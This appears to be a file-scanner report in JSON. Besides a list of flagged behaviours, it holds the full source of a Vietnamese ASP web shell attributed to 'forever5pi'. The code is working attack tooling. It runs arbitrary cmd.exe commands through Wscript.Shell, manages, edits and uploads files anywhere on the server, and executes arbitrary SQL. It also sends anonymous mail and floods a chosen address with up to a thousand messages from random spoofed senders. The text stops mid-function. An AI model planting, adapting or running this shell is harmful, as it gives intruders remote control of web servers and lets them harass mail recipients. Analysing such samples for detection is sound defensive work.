{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADODB.Stream": "May create a text file",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "ChrB": "May attempt to obfuscate specific str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Run": "May run an executable file or a system command",
            "SaveToFile": "May create a text file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "Write": "May write to a file",
            "Wscript.Shell": "May run an executable file or a system command",
            "call": "May call a DLL using Excel 4 Macros",
            "command": "May run PowerShell commands"
        },
        "macro": "<%\n\n' Tac gia: forever5pi (theo huong dan cua anh vicki-vkdt)\n' Email  : forever5pi@yahoo.com\n' Website: http://vnhacker.org\n\noption explicit\n\nServer.ScriptTimeout=10000\nResponse.Buffer=false\n\ndim gURL,gMsg\ndim targetPath,cp_dst,mv_dst,root\ndim FSO,re\ndim zombie_array,special_array\n\n' ###################################### CONFIGURATION ######################################\n\nconst gPassword=\"\" ' mat khau (\"\" : khong dung password)\n\nconst gMax=50 ' chieu dai toi da cho ten file\nconst gBomb=1000 ' so luong mail mac dinh can bomb\n\nconst lnkExt=\"lnk,url\"\nconst editExt=\"htm,html,asp,asa,txt,inc,css,aspx,js,vbs,shtm,shtml,xml,xsl,log,ini,bat,bak\" ' danh sach cac file cho phep edit\n\nconst TmpDir=\"C:\\\" ' thu muc tam thoi mac dinh\nconst Shell=\"cmd.exe\" ' shell mac dinh\n\n' cac chuoi ket noi mac dinh\nconst cstrMSSQL\t\t= \"Provider=SQLOLEDB;Data Source=SERVER_NAME;database=DB_NAME;uid=UID;pwd=PWD\"\nconst cstrJET\t\t= \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=full_path/db_file.mdb\" \nconst cstrACCESS\t= \"DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=full_path/db_file.mdb\"\nconst cstrORACLE\t= \"Provider=OraOLEDB.Oracle.1; Data Source=DB_NAME; User ID=UID; Password=PWD\"\nconst cstrMYSQL\t\t= \"Driver=MySQL;server=SERVER_IP;uid=UID;pwd=PWD;database=DB_NAME\"\nconst cstrDSN\t\t= \"DSN_NAME\"\n\nconst bSize=false' co/khong hien folder-size\n\nconst charset=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\" ' tap ki thu dung de sinh chuoi ngau nhien\n\nzombie_array=array(\"com\",\"net\",\"org\",\"info\",\"vn\",\"cn\") ' mang cac domain z0mbie\nspecial_array=array(\"yahoo.com\",\"hotmail.com\") ' mang cac domain dac biet (dung trong bomb mail)\n\nroot=Server.MapPath(\".\") ' folder mac dinh\n\n' ###########################################################################################\n\ngURL=Request.ServerVariables(\"SCRIPT_NAME\")\nInit()\nif (LCase(Left(Request.ServerVariables(\"HTTP_CONTENT_TYPE\"),19))=\"multipart/form-data\") and (Session(\"allow\")=1) and (Session(\"mode\")=0) then Upload()\nSecure()\nif Request.Form(\"command\")=\"Logout\" then Logout()\nif Request.Form(\"command\")=\"ChangeMode\" then\n\tSession(\"mode\")=Request.Form(\"mode\")\n\tSession(\"switch\")=true\nend if\nselect case Session(\"mode\")\n\tcase 0 myFile()\n\tcase 1 myCMD()\n\tcase 2 mySQL()\n\tcase 3 myMail()\nend select\n\n'###########################################################################################\n\nsub myFile()\n\tif Session(\"switch\")=true then\n\t\ttargetPath=Session(\"targetPath\")\n\t\tif targetPath=\"\" then targetPath=root\n\t\tSession(\"switch\")=false\n\telse\n\t\ttargetPath=Trim(Request.Form(\"folder\"))\n\t\tif targetPath=\"\" then targetPath=root else targetPath=abspath(targetPath)\n\n\t\tselect case Request.Form(\"command\")\n\t\t\tcase \"Download\"\n\t\t\t\tDownload()\n\t\t\t\texit sub\n\t\t\tcase \"Edit\"\n\t\t\t\tEditor()\n\t\t\t\texit sub\n\t\t\tcase \"ChangeAttributesFile\",\"ChangeAttributesFolder\"\n\t\t\t\tChangeAttributesItem()\n\t\t\t\texit sub\n\t\t\tcase \"Tree\"\n\t\t\t\tTree()\n\t\t\t\texit sub\n\t\t\tcase \"Delete\" Delete()\n\t\t\tcase \"Move\" Move()\n\t\t\tcase \"Copy\" Copy()\n\t\t\tcase \"ZipInfo\" ZipInfo()\n\t\t\tcase \"NewFile\",\"NewFolder\" CreateItem()\n\t\t\tcase \"RenameFile\",\"RenameFolder\" RenameItem()\n\t\t\tcase \"OpenFolder\" OpenFolder()\n\t\t\tcase \"LevelUp\" targetPath=FSO.GetParentFolderName(abspath(Request.Form(\"folder\")))\n\t\t\tcase \"LevelRoot\" targetPath=findroot(abspath(Request.Form(\"folder\")))\n\t\tend select\n\n\t\tSession(\"targetPath\")=targetPath\n\tend if\n\t\n\tHtmlHeader(\"\")\n\tHtmlMode()\n\tList()\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub myCMD()\n\tdim bDoIt\n\tdim bEcho\n\tdim szTmpDir,szShell,szCmd,szTmpFile\n\tdim oScript,oScriptNet,oFile\n\t\n\tHtmlHeader(\"\")\n\tHtmlMode()\n\n\tset oScript=Server.CreateObject(\"Wscript.Shell\")\n\tset oScriptNet=Server.CreateObject(\"Wscript.Network\")\n\n\tszTmpDir=Trim(Request.Form(\"tmpdir\"))\n\tszShell=Trim(Request.Form(\"shell\"))\n\tszCmd=Trim(Request.Form(\"cmd\"))\n\tbEcho=CBool(Request.Form(\"echo\"))\n\n\tif Session(\"switch\")=true then\n\t\tSession(\"switch\")=false\n\t\tbDoit=false\n\t\tszTmpDir=Session(\"szTmpDir\")\n\t\tszShell=Session(\"szShell\")\n\t\tszCmd=Session(\"szCmd\")\n\t\tbEcho=Session(\"bEcho\")\n\telse\n\t\tbDoIt=true\n\tend if\n\n\tif szTmpDir=\"\" then szTmpDir=TmpDir else szTmpDir=abspath(szTmpDir)\n\tif szShell=\"\" then szShell=Shell\n\n\tSession(\"szTmpDir\")=szTmpDir\n\tSession(\"szShell\")=szShell\n\tSession(\"szCmd\")=szCmd\n\tSession(\"bEcho\")=bEcho\n\n%>\n<form name=frmCMD method=post action=\"<%=gURL%>\">\n<table>\n<tr><td><b>T</b>mpDir:</td><td><input type=text name=tmpdir value=\"<%=Server.HtmlEncode(szTmpDir)%>\" size=20></td></tr>\n<tr><td><b>S</b>hell:</td><td><input type=text name=shell value=\"<%=Server.HtmlEncode(szShell)%>\" size=20></td></tr>\n<tr><td><b>C</b>md:</td><td><input type=text name=cmd value=\"<%=Server.HtmlEncode(szCmd)%>\" size=80> <input type=submit value=Go></td></tr>\n<tr><td><b>E</b>cho:</td><td><input type=checkbox name=echo value=1<%if bEcho then Response.Write \" checked\"%>></td></tr>\n</table>\n</form>\n<script>frmCMD.cmd.focus()</script>\n<%\n\tif (szCmd<>\"\")  and (bDoIt=true) then\n\t\tif bEcho then\n\t\t\tcall oScript.Run(szShell & \" /c \" & szCmd)\n\t\telse\n\t\t\tszTmpFile = addslash(szTmpDir) & FSO.GetTempName\n\t\t\tcall oScript.Run(szShell & \" /c \" & szCmd & \" > \" & szTmpFile, 0, true)\n\t\t\tif FSO.FileExists(szTmpFile) then set oFile=FSO.OpenTextFile (szTmpFile, 1, false, 0)\n\t\tend if\n\tend if\n%>\n<p><%=FormatDate(Now)%>\n<p><b>I</b>P: <%=Request.ServerVariables(\"LOCAL_ADDR\")%><br>\n<b>U</b>ser: \\\\<%=oScriptNet.ComputerName%>\\\\<%=oScriptNet.UserName%>\n<%\n\tif (IsObject(oFile)) then\n\t\ton error resume next\n%>\n<pre>\n<%=Server.HtmlEncode(oFile.ReadAll)%>\n</pre>\n<%\n\t\toFile.Close\n\t\tcall FSO.DeleteFile(szTmpFile, true)\n\tend if\n\n\tset oScript=nothing\n\tset oScriptNet=nothing\n\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub mySQL()\n\tdim szConn,szSQL1,szSQL2,szSQL,bDoIt\n\tdim intChoice\n\n\tHtmlHeader(\"\")\n\tHtmlMode()\n\n\tszConn=Trim(Request.Form(\"conn\"))\n\tszSQL1=Trim(Request.Form(\"sql1\"))\n\tszSQL2=Trim(Request.Form(\"sql2\"))\n\tintChoice=CInt(Request.Form(\"choice\"))\n\n\tif Session(\"switch\")=true then\n\t\tSession(\"switch\")=false\n\t\tbDoIt=false\n\t\tszConn=Session(\"szConn\")\n\t\tszSQL1=Session(\"szSQL1\")\n\t\tszSQL2=Session(\"szSQL2\")\n\t\tintChoice=Session(\"intChoice\")\n\telse\n\t\tbDoIt=true\n\tend if\n\n\tif intChoice=0 then intChoice=1\n\tif intChoice=1 then szSQL=szSQL1 else szSQL=szSQL2\n\n\tSession(\"szConn\")=szConn\n\tSession(\"szSQL1\")=szSQL1\n\tSession(\"szSQL2\")=szSQL2\n\tSession(\"intChoice\")=intChoice\n\n\tselect case trim(ucase(szConn))\n\t\tcase \"MSSQL\" \n\t\t\tszConn=cstrMSSQL\n\t\t\tszSQL=\"\"\n\t\tcase \"JET\"\n\t\t\tszConn=cstrJET\n\t\t\tszSQL=\"\"\n\t\tcase \"ACCESS\"\n\t\t\tszConn=cstrACCESS\n\t\t\tszSQL=\"\"\n\t\tcase \"ORACLE\"\n\t\t\tszConn=cstrORACLE\n\t\t\tszSQL=\"\"\n\t\tcase \"MYSQL\"\n\t\t\tszConn=cstrMYSQL\n\t\t\tszSQL=\"\"\n\t\tcase \"DSN\"\n\t\t\tszConn=cstrDSN\n\t\t\tszSQL=\"\"\n\tend select\n%>\n<input type=button value=\"<->\" onclick=\"changeInput()\">\n<form name=frmSQL method=post action=\"<%=gURL%>\">\n<input type=hidden name=choice value=\"<%=intChoice%>\">\n<b>C</b>onn: <input type=text name=conn value=\"<%=Server.HtmlEncode(szConn)%>\" size=90> <br>\n<b>S</b>QL:&nbsp; <span id=s1<%if intChoice=2 then Response.Write \" style=\"\"display:none\"\"\"%>><input type=text name=sql1 value=\"<%=Server.HtmlEncode(szSQL1)%>\" size=90></span>\n<span id=s2<%if intChoice=1 then Response.Write \" style=\"\"display:none\"\"\"%>>( [F9] = Go )<br><textarea name=sql2 cols=42 rows=12 onkeydown=\"if (event.keyCode==120) frmSQL.submit();\"><%=Server.HtmlEncode(szSQL2)%></textarea><br></span>\n<input type=submit value=Go>\n</table>\n</form>\n<script>\nfrmSQL.<%if szConn=\"\" then Response.Write \"conn\" else Response.Write \"sql\"&intChoice%>.focus();\nfrmSQL.<%if szConn=\"\" then Response.Write \"conn\" else Response.Write \"sql\"&intChoice%>.focus();\nfunction changeInput() {\n\tif (s1.style.display=='none') {\n\t\ts1.style.display='inline';\n\t\ts2.style.display='none';\n\t\tfrmSQL.choice.value=\"1\";\n\t\tfrmSQL.sql1.focus();\n\t} else {\n\t\ts1.style.display='none';\n\t\ts2.style.display='inline';\n\t\tfrmSQL.choice.value=\"2\";\n\t\tfrmSQL.sql2.focus();\n\t}\n}\n</script>\n<%\n\t\tif (szConn<>\"\") and (szSQL<>\"\") and (bDoIt=true) then\n\t\tdim adoCon, rS\n\t\tdim i,intAffected\n\t\t\n\t\tset adoCon=Server.CreateObject(\"ADODB.Connection\")\n\t\tadoCon.Open szConn\n\t\tset rS=adoCon.Execute(szSQL, intAffected)\n\t\tif (rS.Fields.Count>0) then\n\t\t\t' hien thi ten cua cac truong\n\t\t\tResponse.Write \"<table border=1>\" & vbNewLine & \"<tr>\"\n\t\t\tfor i=0 to rS.Fields.Count-1\n\t\t\t\tResponse.Write \"<td><tt><b>\"\n\t\t\t\tif (rS.Fields(i).Name=\"\") then\n\t\t\t\t\tResponse.Write \"(No column name)\"\n\t\t\t\telse\n\t\t\t\t\tResponse.Write Server.HtmlEncode(rS.Fields(i).Name)\n\t\t\t\tend if\n\t\t\t\tResponse.Write \"</b></tt></td>\"\n\t\t\tnext\n\t\t\tResponse.Write \"</tr>\" & vbNewLine\n\t\t\t' hien thi du lieu tren cac dong\n\t\t\ton error resume next\n\t\t\trS.MoveFirst\n\t\t\tdo while not rS.EOF\n\t\t\t\tResponse.Write \"<tr>\"\n\t\t\t\tfor i=0 to rS.Fields.Count-1\n\t\t\t\t\tResponse.Write \"<td><tt>\"\n\t\t\t\t\tif  IsNull(rs.Fields(i).Value) then\n\t\t\t\t\t\tResponse.Write \"NULL\"\n\t\t\t\t\telseif (Trim(rs.Fields(i).Value)=\"\") then\n\t\t\t\t\t\tResponse.Write \"&nbsp;\"\n\t\t\t\t\telse\n\t\t\t\t\t\tResponse.Write Server.HtmlEncode(rS.Fields(i).Value)\n\t\t\t\t\tend if\n\t\t\t\t\tResponse.Write \"</tt></td>\"\n\t\t\t\tnext\n\t\t\t\tResponse.Write \"</tr>\" & vbNewLine\n\t\t\t\trS.MoveNext\n\t\t\tloop\n\t\t\trS.Close\n\t\t\tResponse.Write \"</table>\" & vbNewLine\n\t\tend if\n\t\t\n\t\tResponse.Write \"<p><tt>(\" & intAffected & \" row(s) affected)</tt>\"\n\n\t\tset rS=nothing\n\t\tset adoCon=nothing\n\tend if\n\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n\n'###########################################################################################\n\nsub myMail()\n\tdim strFrom,strTo,strSubject,strBody,bHtml,intNumber,i,StartTime,EndTime,bDoIt\n\tdim objMail,objMsg\n\n\tstrTo=Trim(Request.Form(\"to\"))\n\n\tselect case Request.Form(\"subcommand\")\n\t\tcase \"Send\"\n\t\t\tstrFrom=Trim(Request.Form(\"from\"))\n\t\t\tstrSubject=Trim(Request.Form(\"subject\"))\n\t\t\tstrBody=Request.Form(\"body\")\n\t\t\tbHtml=CBool(Request.Form(\"html\"))\n\t\tcase \"Bomb\"\n\t\t\tif IsNumeric(Request.Form(\"number\")) then intNumber=Int(Request.Form(\"number\"))\n\t\t\tstrFrom=Session(\"strFrom\")\n\t\t\tstrSubject=Session(\"strSubject\")\n\t\t\tstrBody=Session(\"strBody\")\n\t\t\tbHtml=Session(\"bHtml\")\n\tend select\n\t\n\tif Session(\"switch\")=true then\n\t\tSession(\"switch\")=false\n\t\tbDoIt=false\n\t\tstrFrom=Session(\"strFrom\")\n\t\tstrTo=Session(\"strTo\")\n\t\tstrSubject=Session(\"strSubject\")\n\t\tstrBody=Session(\"strBody\")\n\t\tbHtml=Session(\"bHtml\")\n\t\tintNumber=Session(\"intNumber\")\n\telse\n\t\tbDoIt=true\n\tend if\n\n\tif (intNumber<=0) then intNumber=gBomb\n\n\tSession(\"strFrom\")=strFrom\n\tSession(\"strTo\")=strTo\n\tSession(\"strSubject\")=strSubject\n\tSession(\"strBody\")=strBody\n\tSession(\"bHtml\")=bHtml\n\tSession(\"intNumber\")=intNumber\n\t\n\tHtmlHeader(\"\")\n\tHtmlMode()\n\n\tif bDoIt then\n\t\tselect case Request.Form(\"subcommand\")\n\t\t\tcase \"Send\"\n\t\t\t\tif IsValidEmail(strTo) then\n\t\t\t\t\tset objMail=Server.CreateObject(\"CDONTS.NewMail\")\n\t\t\t\t\tobjMail.To=strTo\n\t\t\t\t\tobjMail.From=strFrom\n\t\t\t\t\tobjMail.Subject=strSubject\n\t\t\t\t\tobjMail.Body=strBody\n\t\t\t\t\tif bHtml then\n\t\t\t\t\t\tobjMail.BodyFormat=0 'HTML\n\t\t\t\t\t\tobjMail.MailFormat=0 'MIME\n\t\t\t\t\tend if\n\t\t\t\t\tobjMail.Send\n\t\t\t\t\tset objMail=nothing\n\t\t\t\t\tResponse.Write \"<b>M</b>essage was sent to \" & strTo & \" successfully.\" & vbNewLine\n\t\t\t\tend if\n\t\t\tcase \"Bomb\"\n\t\t\t\tif IsValidEmail(strTo) then\n\t\t\t\t\tResponse.Write \"<b>B</b>ombing \" & Replace(FormatNumber(intNumber,0),\",\",\".\") & \" mail\"\n\t\t\t\t\tif intNumber>1 then Response.Write \"s\"\n\t\t\t\t\tResponse.Write \" to \" & strTo & \" ... \"\n\t\t\t\t\tStartTime=Timer\n\t\t\t\t\tset objMsg=Server.CreateObject(\"CDO.Message\")\n\t\t\t\t\tobjMsg.To=strTo\n\t\t\t\t\tRandomize\n\t\t\t\t\tfor i=1 to intNumber\n\t\t\t\t\t\tobjMsg.From=makeEmail()\n\t\t\t\t\t\tobjMsg.Subject=makeText(Int((50-25+1)*Rnd+25))\n\t\t\t\t\t\tobjMsg.TextBody=makeText(Int((100-50+1)*Rnd+50))\n\t\t\t\t\t\tobjMsg.Send\n\t\t\t\t\tnext\n\t\t\t\t\tset objMsg=nothing\n\t\t\t\t\tEndTime=Timer\n\t\t\t\t\tResponse.Write howlong(EndTime-StartTime) & vbNewLine\n\t\t\t\tend if\n\t\tend select\n\tend if\n%>\n<p>\n<table border=1>\n<tr>\n <td width=50%>\n <form name=frmSend method=post action=\"<%=gURL%>\">\n <table>\n <tr>\n  <td colspan=2>a) <b>A</b>nonymous Mail</td>\n </tr>\n <tr>\n  <td><b>F</b>rom:</td>\n  <td><input type=text name=from value=\"<%=Server.HtmlEncode(strFrom)%>\" size=25></td>\n </tr>\n <tr>\n  <td><b>T</b>o:</td>\n  <td><input type=text name=to value=\"<%=Server.HtmlEncode(strTo)%>\" size=25></td>\n </tr>\n <tr>\n  <td><b>S</b>ubject:</td>\n  <td><input type=text name=subject value=\"<%=Server.HtmlEncode(strSubject)%>\" size=50></td>\n </tr>\n <tr>\n  <td valign=top><b>B</b>ody:</td>\n  <td><textarea name=body cols=37 rows=12><%=Server.HtmlEncode(strBody)%></textarea></td>\n </tr>\n <tr>\n  <td><b>H</b>tml:</td>\n  <td><input type=checkbox name=html value=1<%if bHtml=true then Response.Write \" checked\"%>></td>\n </tr>\n <tr>\n  <td colspan=2><input type=submit name=subcommand value=Send></td>\n </tr>\n </table>\n </form>\n </td>\n <td width=50% valign=top>\n <form name=frmBomb method=post action=\"<%=gURL%>\">\n <table>\n <tr>\n  <td colspan=2>b) <b>B</b>omb Mail</td>\n </tr>\n <tr>\n  <td><b>A</b>ddress:</td>\n  <td><input type=text name=to value=\"<%=Server.HtmlEncode(strTo)%>\" size=25></td>\n </tr>\n <tr>\n  <td><b>N</b>umber:</td>\n  <td><input type=text name=number value=<%=intNumber%>></td>\n </tr>\n <tr>\n  <td colspan=2><input type=submit name=subcommand value=Bomb></td>\n </tr>\n </table>\n </form>\n </td>\n</tr>\n</table>\n<%\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nfunction IsValidEmail(strEAddress)\n\tdim objRegExpr\n\tset objRegExpr = New RegExp\n\tobjRegExpr.Pattern = \"^[a-zA-Z0-9][\\w\\.-]*[a-zA-Z0-9]@[\\w-\\.]*[a-zA-Z0-9]\\.[a-zA-Z]{2,7}$\"\n\tobjRegExpr.Global = true\n\tobjRegExpr.IgnoreCase = False\n\tIsValidEmail = objRegExpr.Test(strEAddress)\n\tset objRegExpr = nothing\nend function\n\n'###########################################################################################\n\nfunction makeEmail()\n\tRandomize\n\tif Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\" & zombie_array(Int((UBound(zombie_array)-0+1)*Rnd+0)) else makeEmail=makeText(8) & \"@\" & special_array(Int((UBound(special_array)-0+1)*Rnd+0))\nend function\n\n'###########################################################################################\n\nfunction makeText(intLen)\n\tdim strNewText,i\n\tstrNewText=\"\"\n\tRandomize\n\tfor i=1 to intLen\n\t\tstrNewText=strNewText & Mid(charset,Int((Len(charset)-1+1)*Rnd+1),1)\n\tnext\n\tmakeText=strNewText\nend function\n\n'###########################################################################################\n\nfunction howlong(intTime)\n\tif (intTime<60) then\n\t\thowlong=intTime & \" second(s)\"\n\telseif (intTime<60*60) then\n\t\thowlong=FormatNumber(intTime/60,2) & \" minute(s)\"\n\telse\n\t\thowlong=FormatNumber(intTime/(60*60),2) & \" hour(s)\"\n\tend if\nend function\n\n'###########################################################################################\n\nsub Tree()\n\tdim path\n\tpath=abspath(Request.Form(\"param\"))\n\tif FSO.FolderExists(path) then\n%>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title><%=path%></title>\n<style>\nbody,td{font-family:Fixedsys}\na{color:#0000ff}\n</style>\n</head>\n<body bgcolor=#000000 text=#ffffff>\n<%\n\t\ttree_dir(path)\n%>\n</body>\n</html>\n<%\n\telse\n%>\n<script>alert('Folder not found !');window.close();</script>\n<%\n\tend if\n\tDestroy()\nend sub\n\nsub tree_dir(path)\n\tdim strAttrib,strSize\n\n\ton error resume next\n\n\tdim oFolder\n\tdim oSubFolders,oSubFolder\n\tdim oFiles,oFile\n\tdim oSubFolders2,oSubFolder2\n\tdim oFiles2,oFile2\n\n\tset oFolder=FSO.GetFolder(path)\n\tset oSubFolders=oFolder.SubFolders\n\tset oFiles=oFolder.Files\n\n\tResponse.Write \"<p>\" & FSO.GetAbsolutePathName(path)\n\n\tstrAttrib=GetAttributes(oFolder.Attributes)\n\n\tif strAttrib<>\"&nbsp;\" then Response.Write \" (\" & GetAttributes(oFolder.Attributes) & \")\"\n\n\tResponse.Write vbNewLine\n\n\tif (oSubFolders.Count>0) or (oFiles.Count>0) then\n%>\n<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>\n<tr bgcolor=#000000>\n <td><font color=#FFFF00>Name</font></td>\n <td align=center><font color=#FFFF00>Size</font></td>\n <td align=center><font color=#FFFF00>Type</font></td>\n <td align=center><font color=#FFFF00>Modified</font></td>\n <td align=center><font color=#FFFF00>Attributes</font></td>\n</tr>\n<%\n\t\t' liet ke thu muc\n\t\tfor each oSubFolder in oSubFolders\n%>\n<tr bgcolor=#000000>\n <td><%=oSubFolder.Name%></td>\n <td align=right>&nbsp;</td>\n <td align=center>DIR</td>\n <td align=center><%=FormatDate(oSubFolder.DateLastModified)%></td>\n <td><%=GetAttributes(oSubFolder.Attributes)%></td>\n</tr>\n<%\n\t\tnext\n\n\t\t' liet ke file\n\t\tfor each oFile in oFiles\n%>\n<tr bgcolor=#000000>\n <td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"url\") then Response.Write \" title=\"\"\" & FindLink(path & \"\\\" & oFile.Name) & \"\"\"\"%>><%=oFile.Name%></td>\n <td align=right><%=FormatSize(oFile.Size)%></td>\n <td align=center><%=oFile.Type%></td>\n <td align=center><%=FormatDate(oFile.DateLastModified)%></td>\n <td><%=GetAttributes(oFile.Attributes)%></td>\n</tr>\n<%\n\t\tnext\n\t\tstrSize=FormatSize(oFolder.Size)\n%>\n<tr bgcolor=#000000>\n <td colspan=5 align=center><%=oSubFolders.Count%> folder(s), <%=oFiles.Count%> file(s)<%if strSize<>\"\" then Response.Write \" (\" & strSize & \")\"%></td>\n</tr>\n</table>\n<%\n\t\t' goi de qui\n\t\tfor each oSubFolder in oSubFolders\n\t\t\tset oSubFolder2=oSubFolder.SubFolders\n\t\t\tset oFile2=oSubFolder.Files\n\n\t\t\tif (oSubFolder2.Count>0) or (oFile2.Count>0) then\n\t\t\t\ttree_dir(oSubFolder.ParentFolder & \"\\\" & oSubFolder.Name)\n\t\t\tend if\n\n\t\t\tset oSubFolder2=nothing\n\t\t\tset oFile2=nothing\n\t\tnext\n\tend if\n\n\tset oSubFolder=nothing\n\tset oFiles=nothing\n\tset oFolder=nothing\nend sub\n\n'###########################################################################################\n\nsub Editor()\n\tdim f,name,path\n\t\n\ton error resume next\n\n\tHtmlHeader(\"\")\n\n\tname=Request.Form(\"param\")\n\tpath=addslash(targetPath) & name\n\n\tselect case Request.Form(\"subcommand\")\n\t\tcase \"Save\",\"SaveAs\"\n\t\t\tset f=FSO.OpenTextFile(path,2,true,-2)\n\t\t\tif Err.Number<>0 then\n\t\t\t\tgMsg=\"Can not write to the file \"\"\" & name & \"\"\", permission denied!\"\n\t\t\t\tErr.Clear\n\t\t\telse\n\t\t\t\tf.Write Request.Form(\"content\")\n\t\t\tend if\n\t\t\tset f=nothing\n\t\t\tset f=FSO.OpenTextFile(path,1,false,-2)\n\t\tcase else\n\t\t\tif not FSO.FileExists(path) then\n\t\t\t\tgMsg=\"The file \"\"\" & name & \"\"\" does not exist\"\n\t\t\t\tset f=FSO.CreateTextFile(path,false)\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=gMsg & \", also unable to create new file.\"\n\t\t\t\t\tErr.Clear\n\t\t\t\telse\n\t\t\t\t\tgMsg=gMsg & \", created new file.\"\n\t\t\t\tend if\n\t\t\telse\n\t\t\t\tset f=FSO.OpenTextFile(path,1,false,-2)\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=\"Can not read from the file \"\"\" & name & \"\"\", permission denied!\"\n\t\t\t\t\tErr.Clear\n\t\t\t\tend if\n\t\t\tend if\n\tend select\n%>\n<% if gMsg<>\"\" then Response.Write \"<script>alert('\" & gMsg & \"')</script>\" & vbNewLine %>\n<p><b>E</b>diting - \"<%=path%>\"<br>\n<form name=frmFile method=post action=\"<%=gURL%>\">\n<b>W</b>rap<input type=checkbox id=wrap onclick=\"EditorCommand('WordWrap')\">\n<center>\n<table width=100%>\n<tr><td align=center>\n<textarea name=content rows=25 cols=46 style=\"width:580;height:330\" wrap=off><%=Server.HTMLEncode(f.ReadAll)%></textarea>\n</td></tr>\n<tr><td align=center>\n<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=button value=\"Save As\" onclick=\"EditorCommand('SaveAs')\"> <input type=button value=Reload onclick=\"EditorCommand('Reload')\"> <input type=button value=Close onclick=\"window.close()\">\n</td></tr>\n</table>\n</center>\n<script>frmFile.content.focus()</script>\n<input type=hidden name=command value=Edit>\n<input type=hidden name=subcommand value=\"\">\n<input type=hidden name=param value=\"<%=name%>\">\n<input type=hidden name=folder value=\"<%=Request.Form(\"folder\")%>\">\n</form>\n<%\n\tset f=nothing\n\tHtmlJsEditor()\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub ChangeAttributesItem()\n\tdim item,itemType,itemName,itemPath,itemAttrib\n\t\n\titemType=Request.Form(\"command\")\n\titemName=Request.Form(\"param\")\n\titemPath=addslash(targetPath) & itemName\n\n\tHtmlHeader(\"\")\n\n\tselect case itemType\n\t\tcase \"ChangeAttributesFile\" set item=FSO.GetFile(itemPath)\n\t\tcase \"ChangeAttributesFolder\" set item=FSO.GetFolder(itemPath)\n\tend select\n\n\tif Request.Form(\"subcommand\")=\"change\" then\n\t\titemAttrib=int(Request.Form(\"r\"))\n\t\titemAttrib=itemAttrib+int(Request.Form(\"h\"))\n\t\titemAttrib=itemAttrib+int(Request.Form(\"a\"))\n\t\titemAttrib=itemAttrib+int(Request.Form(\"s\"))\n\t\ton error resume next\n\t\titem.Attributes=int(itemAttrib)\n\t\tif Err.Number<>0 then Response.Write \"<script>alert('Permission denined')</script>\" & vbNewLine\n\tend if\n\n\titemAttrib=item.Attributes\n%>\n<b>C</b>hange attributes - \"<%=itemName%>\"\n<p align=center>\n<form name=frmAttrib method=post action=\"<%=gURL%>\">\n<input type=hidden name=command value=\"<%=itemType%>\">\n<input type=hidden name=subcommand value=change>\n<input type=hidden name=folder value=\"<%=targetPath%>\">\n<input type=hidden name=param value=\"<%=itemName%>\">\n<table>\n<tr>\n <td><input type=checkbox name=r value=1 <%if (itemAttrib and 1)>0 then Response.Write \" checked\"%>>Read-only</td>\n <td><input type=checkbox name=h value=2 <%if (itemAttrib and 2)>0 then Response.Write \" checked\"%>>Hidden</td>\n</tr>\n<tr>\n <td><input type=checkbox name=a value=32 <%if (itemAttrib and 32)>0 then Response.Write \" checked\"%>>Archive</td>\n <td><input type=checkbox name=s value=4 <%if (itemAttrib and 4)>0 then Response.Write \" checked\"%>>System</td>\n</tr>\n</table><br>\n<input type=button value=OK onclick=\"frmAttrib.submit()\"> <input type=button value=Close onclick=\"window.close()\">\n</form>\n</p>\n<%\n\tset itemType=nothing\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub OpenFolder()\n\tif Trim(Request.Form(\"folder\"))=\"\" then \n\t\tif Trim(Request.Form(\"param\"))=\"\" then targetPath=root else targetPath=abspath(Trim(Request.Form(\"param\")))\n\telse\n\t\ttargetPath=addslash(Trim(Request.Form(\"folder\"))) & Trim(Request.Form(\"param\"))\n\tend if\nend sub\n\n'###########################################################################################\n\nsub CreateItem()\n\tdim itemType,itemName,itemPath\t\n\titemType=request.form(\"command\")\n\titemName=request.form(\"param\")\n\titemPath=addslash(targetPath) & itemName\n\n\ton error resume next\n\n\tselect case itemType\n\t\tcase \"NewFolder\"\n\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then\n\t\t\t\tFSO.CreateFolder(itemPath)\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=\"Unable to create the folder \"\"\" & itemName & \"\"\", an error occured...\"\n\t\t\t\telse\n\t\t\t\t\tgMsg=\"Created the folder \"\"\" & itemName & \"\"\"...\"\n\t\t\t\tend if\n\t\t\telse\n\t\t\t\tgMsg=\"Unable to create the folder \"\"\" & itemName & \"\"\", there exists a file or a folder with the same name...\"\n\t\t\tend if\n\t\tcase \"NewFile\"\n\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then\n\t\t\t\tFSO.CreateTextFile(itemPath)\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=\"Unable to create the file \"\"\" & itemName & \"\"\", an error occured...\"\n\t\t\t\telse\n\t\t\t\t\tgMsg=\"Created the file \"\"\" & itemName & \"\"\"...\"\n\t\t\t\tend 